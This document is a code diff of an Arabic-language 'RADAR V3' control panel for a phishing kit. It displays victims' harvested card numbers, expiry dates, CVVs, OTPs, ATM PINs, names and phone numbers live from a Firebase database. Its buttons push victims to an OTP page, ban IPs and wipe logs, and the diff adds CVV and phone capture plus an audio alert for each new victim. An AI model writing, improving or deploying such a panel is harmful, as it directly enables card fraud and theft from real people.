@@ -3,47 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحكم الموحد - V3</title>
+    <title>لوحة التحكم الاحترافية</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --p-clr: #006C35; --dark: #0a0a0a; --accent: #00ff88; }
+        :root { --p-clr: #006C35; --dark: #0a0a0a; --accent: #00ff88; --error: #ff4d4d; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--dark); color: #fff; margin: 0; }
         
         /* شاشة الدخول */
         #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; justify-content: center; align-items: center; }
-        .login-card { background: #111; padding: 40px; border-radius: 15px; border: 1px solid var(--p-clr); width: 320px; text-align: center; }
+        .login-card { background: #111; padding: 35px; border-radius: 15px; border: 1px solid var(--p-clr); width: 320px; text-align: center; }
         .login-card input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; text-align: center; font-size: 18px; outline: none; }
-        .login-card button { width: 100%; padding: 12px; background: var(--p-clr); border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 16px; }
+        .login-card button { width: 100%; padding: 12px; background: var(--p-clr); border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
 
-        /* اللوحة */
-        .h-nav { background: #1a1a1a; padding: 15px; border-bottom: 2px solid var(--p-clr); display: flex; justify-content: space-between; align-items: center; }
-        .main-c { padding: 20px; max-width: 1200px; margin: auto; }
-        .r-row { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 12px; display: grid; grid-template-columns: 1.5fr 2fr 1fr 1fr 1fr; gap: 15px; align-items: center; border-right: 5px solid var(--p-clr); }
-        .c-num { color: #ff4d4d; font-family: monospace; font-size: 18px; background: #2a1010; padding: 5px; border-radius: 5px; text-align: center; }
-        .btn-action { padding: 8px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; margin: 2px; }
+        /* الهيدر */
+        .h-nav { background: #1a1a1a; padding: 15px 25px; border-bottom: 2px solid var(--p-clr); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        
+        /* الحاويات والكروت */
+        .main-c { padding: 20px; }
+        .r-row { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 15px; border-right: 5px solid var(--p-clr); display: grid; grid-template-columns: 1fr 1.5fr 1fr 1fr 1.2fr; gap: 15px; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        
+        .user-box b { color: var(--accent); display: block; margin-bottom: 5px; }
+        .card-box { background: #000; padding: 10px; border-radius: 5px; border: 1px solid #333; text-align: center; }
+        .c-num { color: var(--error); font-family: monospace; font-size: 17px; display: block; margin-bottom: 5px; }
+        .c-extra { font-size: 12px; color: #aaa; }
+        
+        .otp-box { text-align: center; font-weight: bold; }
+        .otp-val { color: #00aaff; font-size: 22px; display: block; }
+        .pin-val { color: var(--error); font-size: 14px; }
+
+        .status-box { font-size: 11px; color: #777; line-height: 1.6; }
+        
+        .actions { display: flex; flex-direction: column; gap: 6px; }
+        button.act-btn { padding: 8px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px; }
+        .b-otp { background: var(--p-clr); color: #fff; }
+        .b-ban { background: #444; color: #fff; }
+        .b-del { background: #222; color: #777; }
+        
+        @media (max-width: 900px) { .r-row { grid-template-columns: 1fr 1fr; } }
     </style>
 </head>
 <body>
 
 <div id="login-overlay">
     <div class="login-card">
-        <h2 style="margin:0; color:var(--p-clr);">دخول النظام</h2>
-        <input type="password" id="pass-field" placeholder="أدخل رمز الوصول">
-        <button type="button" onclick="checkAccess()">دخول الآن</button>
+        <h2 style="margin:0; color:var(--p-clr);">نظام التحكم</h2>
+        <input type="password" id="pass-field" placeholder="رمز الوصول السري">
+        <button onclick="checkAccess()">دخول اللوحة</button>
     </div>
 </div>
 
 <div class="h-nav">
-    <div style="color: var(--accent);">المتواجدون: <span id="_online">0</span></div>
-    <div style="font-weight: bold;">RADAR CONTROL PANEL</div>
-    <button onclick="localStorage.clear(); location.reload();" style="background:#444; color:#fff; border:none; padding:5px 10px; cursor:pointer;">خروج</button>
+    <div style="color: var(--accent);">المتواجدون الآن: <b id="_online">0</b></div>
+    <div style="font-weight: bold; font-size: 18px;">RADAR V3 - CONTROL</div>
+    <button onclick="localStorage.clear(); location.reload();" style="background:none; border:1px solid #444; color:#888; cursor:pointer; padding:5px 10px; border-radius:4px;">خروج</button>
 </div>
 
 <div class="main-c" id="_logs"></div>
 
+<audio id="_notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
 <script>
-    const _cfg = {
+    const firebaseConfig = {
         apiKey: "AIzaSyC84Zm9LxskNvp0Bq8LutoVX...", 
         authDomain: "system-cloud-v3.firebaseapp.com",
         databaseURL: "https://system-cloud-v3-default-rtdb.firebaseio.com",
@@ -53,42 +74,47 @@
         appId: "1:48216753818:web:ef537a31f36a08dffc4123"
     };
 
-    firebase.initializeApp(_cfg);
-    const _db = firebase.database();
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    // دالة الدخول الصريحة
     function checkAccess() {
-        const p = document.getElementById('pass-field').value;
-        if(p === "H1234567890H") {
-            // إخفاء الشاشة فوراً
-            document.getElementById('login-overlay').setAttribute('style', 'display:none !important');
-            localStorage.setItem('v3_auth', 'true');
-        } else {
-            alert("الرمز غير صحيح");
-        }
+        if(document.getElementById('pass-field').value === "H1234567890H") {
+            document.getElementById('login-overlay').style.display = 'none';
+            localStorage.setItem('auth_v3', 'active');
+        } else { alert("الرمز خطأ!"); }
     }
 
-    // التحقق من الجلسة عند فتح الصفحة
-    if(localStorage.getItem('v3_auth') === 'true') {
+    if(localStorage.getItem('auth_v3') === 'active') {
         document.getElementById('login-overlay').style.display = 'none';
     }
 
-    // عرض البيانات
-    function _draw(id, data) {
+    function drawCard(id, data) {
         let card = document.getElementById('card-' + id);
         const user = data.personal_info || {};
         const cardInfo = data.card_details || {};
         const geo = data.geo_info || { country: "غير معروف", flag: "🏳️" };
 
         const html = `
-            <div><strong>${geo.flag} ${user.fullName || '---'}</strong><br><small style="color:#888;">${geo.country}</small></div>
-            <div class="c-num">${cardInfo.cardNumber || '**** **** **** ****'}</div>
-            <div style="text-align:center; color:#00aaff;">OTP: ${cardInfo.otp || '----'}<br><span style="color:#ff4d4d">PIN: ${cardInfo.atm_pin || '----'}</span></div>
-            <div style="font-size:11px; color:#666;">${data.current_page || 'Index'}</div>
-            <div>
-                <button class="btn-action" style="background:var(--p-clr); color:#fff;" onclick="_cmd('${id}', 'go_to_otp')">طلب OTP</button>
-                <button class="btn-action" style="background:#555; color:#fff;" onclick="_ban('${data.user_ip}')">حظر</button>
-                <button class="btn-action" style="background:#222; color:#888;" onclick="_del('${id}')">حذف</button>
+            <div class="user-box">
+                <b>${geo.flag} ${user.fullName || '---'}</b>
+                <span style="font-size:12px; color:#888;">📞 ${user.phone || '---'}</span>
+            </div>
+            <div class="card-box">
+                <span class="c-num">${cardInfo.cardNumber || '**** **** **** ****'}</span>
+                <span class="c-extra">تاريخ: ${cardInfo.expiryDate || '--/--'} | CVV: ${cardInfo.cvv || '***'}</span>
+            </div>
+            <div class="otp-box">
+                <span class="otp-val">${cardInfo.otp || '----'}</span>
+                <span class="pin-val">ATM PIN: ${cardInfo.atm_pin || '----'}</span>
+            </div>
+            <div class="status-box">
+                البلد: ${geo.country}<br>
+                الصفحة: <span style="color:var(--accent)">${data.current_page || 'Index'}</span>
+            </div>
+            <div class="actions">
+                <button class="act-btn b-otp" onclick="sendCommand('${id}', 'go_to_otp')">طلب OTP</button>
+                <button class="act-btn b-ban" onclick="banIP('${data.user_ip}')">حظر العميل</button>
+                <button class="act-btn b-del" onclick="deleteLog('${id}')">حذف</button>
             </div>
         `;
 
@@ -96,18 +122,24 @@
         else {
             card = document.createElement('div'); card.id = 'card-' + id; card.className = 'r-row';
             card.innerHTML = html; document.getElementById('_logs').insertBefore(card, document.getElementById('_logs').firstChild);
+            document.getElementById('_notif').play().catch(e=>{});
         }
     }
 
-    _db.ref('orders').on('child_added', (s) => _draw(s.key, s.val()));
-    _db.ref('orders').on('child_changed', (s) => _draw(s.key, s.val()));
-    _db.ref('orders').on('child_removed', (s) => document.getElementById('card-' + s.key)?.remove());
+    db.ref('orders').on('child_added', (s) => drawCard(s.key, s.val()));
+    db.ref('orders').on('child_changed', (s) => drawCard(s.key, s.val()));
+    db.ref('orders').on('child_removed', (s) => document.getElementById('card-' + s.key)?.remove());
 
-    function _cmd(id, st) { _db.ref('orders/' + id).update({ next_step: st }); }
-    function _del(id) { if(confirm('حذف؟')) _db.ref('orders/' + id).remove(); }
-    function _ban(ip) { if(confirm('حظر الـ IP؟')) { _db.ref('banned_ips/' + ip.replace(/\./g, '_')).set(true); alert('تم الحظر'); } }
+    function sendCommand(id, st) { db.ref('orders/' + id).update({ next_step: st }); }
+    function deleteLog(id) { if(confirm('حذف البيانات؟')) db.ref('orders/' + id).remove(); }
+    function banIP(ip) { 
+        if(confirm('حظر هذا العميل نهائياً؟')) { 
+            db.ref('banned_ips/' + ip.replace(/\./g, '_')).set(true); 
+            alert('تم الحظر');
+        } 
+    }
 
-    _db.ref('live_sessions').on('value', (s) => {
+    db.ref('live_sessions').on('value', (s) => {
         let count = 0; s.forEach(x => { if(Date.now() - x.val().last_seen < 30000) count++; });
         document.getElementById('_online').innerText = count;
     });
